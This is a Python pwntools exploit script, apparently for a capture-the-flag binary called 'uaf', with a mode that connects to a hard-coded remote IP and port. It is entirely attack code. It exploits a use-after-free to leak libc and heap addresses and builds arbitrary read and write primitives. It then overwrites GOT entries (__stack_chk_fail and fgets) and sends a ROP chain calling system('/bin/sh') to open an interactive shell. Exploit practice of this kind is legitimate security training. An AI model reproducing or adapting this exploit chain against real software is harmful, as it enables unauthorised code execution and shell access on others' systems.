#!/usr/bin/env python2
from pwn import *
from huepy import *
import sys

# Path to the binary
bin = "./uaf"
# Path to libc
lib = "/lib/i386-linux-gnu/libc.so.6"

# Place global offsets here
junk = "A" * 0xd8

context(terminal=['tmux', 'new-window'], os='linux', arch='i386')
if 'debug' in sys.argv:
    context.log_level='debug'
if 'pause' not in sys.argv:
    def pause():
        pass
if 'remote' in sys.argv:
    p = remote("35.207.132.47", 22229)
    # place remote offsets here
    lib = "remote libc.so"

else:
    p = process(bin)
    # place local offsets here


log.info("Mapping binary")
elf = ELF(bin)
libc = ELF(lib)
rop = ROP(libc)

################## ROP Gadgets ##################
ret = 0x0804916e    # ret;

################## Wrappers ##################
def create_arr(arr):
    p.sendline("1")
    p.readuntil("?\n")
    p.sendline("%s" % str(len(arr)))
    p.readuntil(":\n")
    p.sendline(" ".join(map(str, arr)))
    p.readuntil("array: ")
    id = int(p.readline())
    log.debug("Created array at " + white(hex(id)))
    return id

def create_str(str):
    p.sendline("2")
    p.readuntil(":\n")
    p.sendline(str)
    p.readuntil(": ")
    id = int(p.readline())
    log.debug("Created string at " + white(hex(id)))
    return id

def edit_arr(ptr, index, new):
    p.sendline("3")
    p.readuntil(":\n")
    p.sendline(str(int(ptr)))
    p.readuntil(":\n")
    p.sendline(str(int(index)))
    p.readuntil(":\n")
    p.sendline(str(int(new)))

def print_arr(ptr):
    p.sendline("4")
    p.readuntil(":\n")
    p.sendline(str(int(ptr)))
    p.readuntil(":\n")
    result = p.readline().strip()
    if ", " in result:
        return map(int, result[1:-1].split(", "))   # convert from string to list
    return int(result[1:-1])

def print_str(ptr):
    p.sendline("5")
    p.readuntil(":\n")
    p.sendline(str(int(ptr)))
    p.readuntil(":\n")
    result = p.readuntil('\n\n')
    return result[1:-1]

def free_arr(ptr):
    log.debug("free(%s)" % white(hex(ptr)))
    p.sendline("6")
    p.readuntil(":\n")
    p.sendline(str(int(ptr)))

def free_str(ptr, debug=False):
    if debug:
        log.success("free(%s)" % white(hex(ptr)))
    p.sendline("7")
    p.readuntil(":\n")
    p.sendline(str(int(ptr)))

################## Exploitation helpers ##################
def toUnsigned32(int):
    return int & 0xffffffff

def toSigned32(n):
    n = n & 0xffffffff
    return n | (-(n & 0x80000000))

def verifyBase(addr):
    assert(addr & 4095 == 0)
    return addr

def popAShell(ROP):
  rop.system(next(libc.search('/bin/sh\x00')))
  log.success("Pop A Shell chain: \n" + white(rop.dump()))
  return rop.chain()
################## Exploit Stage 1: leak stuff ##################
arr1 = create_arr([1]*4)
arr2 = create_arr([2]*4)
leak_arr = create_arr([2])

free_arr(arr1)
free_arr(arr2)

edit_arr(arr2, 0x7, elf.got['puts'])

leaked_puts = toUnsigned32(print_arr(leak_arr))
log.success('Leaked puts@libc: ' + white(hex(leaked_puts)))
libc.address = verifyBase(leaked_puts - libc.symbols['puts'])
heap_base = verifyBase(arr1 - 0x10b8)

log.success('Heap base: ' + white(hex(heap_base)))
log.success('Libc base: ' + white(hex(libc.address)))
log.debug('fgets@got: ' + white(hex(elf.got['fgets'])))
log.debug('fgets@libc: ' + white(hex(libc.symbols['fgets'])))
log.debug('gets@libc: ' + white(hex(libc.symbols['gets'])))
log.debug('system@libc: ' + white(hex(libc.symbols['system'])))

################## Exploit Stage 2: Build exploit primitives ##################
log.info('Building read32 primitive...')
def read32(addr):
    edit_arr(arr2, 0x7, addr)
    return print_arr(leak_arr)

read32_test = read32(elf.address)
log.info('Testing read32: \n' + hexdump(read32_test))
if read32_test != 0x464c457f:
    log.critcal("read32 doesn't work...")
    exit(-1)
log.success('Done!')


log.info('Building write32 primitive...')
def write32(addr, data):
    edit_arr(arr2, 0x7, addr)
    edit_arr(leak_arr, 0x0, data)

write32(heap_base+0x100, toSigned32(0xdeadbeef))
write32_test = toUnsigned32(read32(heap_base+0x100))
log.info('Testing write32: \n' + hexdump(write32_test))
if write32_test != 0xdeadbeef:
    log.critical("write32 doesn't work...")
    exit(-1)
log.success('Done!')

log.success(green("Got stable memory read/write!"))
log.info('Cleaning up...')
write32(heap_base+0x100, 0x00000000)
log.success('Done!')

################## Exploit Stage 3: Overwrite some functions ##################
log.info('Patching __stack_chk_fail...')
write32(elf.got['__stack_chk_fail'], ret)
log.success('Done!')

log.info('Overwriting fgets() with gets()...')
write32(elf.got['fgets'], toSigned32(libc.symbols['gets']))
log.success('Done!')

################## Exploit Stage 4: ROP to get a shell ##################
log.info('Building Rop-chain...')
p.sendline(junk + popAShell(rop))
p.read()
log.success('Here we go...')
p.sendline("0")
p.read()

p.interactive()
